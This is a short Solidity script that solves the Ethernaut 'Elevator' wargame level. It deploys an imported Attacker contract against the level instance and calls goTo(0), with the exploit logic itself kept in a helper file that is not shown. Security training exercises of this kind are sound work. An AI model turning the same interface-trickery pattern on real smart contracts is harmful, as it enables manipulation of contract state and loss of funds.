// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Elevator} from "ethernaut/levels/Elevator.sol";
import {Attacker} from "~/helpers/Elevator.sol";

contract Check is CheckScript("ELEVATOR") {}

contract Solve is SolveScript("ELEVATOR") {
    Elevator target;

    constructor() {
        target = Elevator(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker(target);
        attacker.goTo(0); // any floor number should work
    }
}
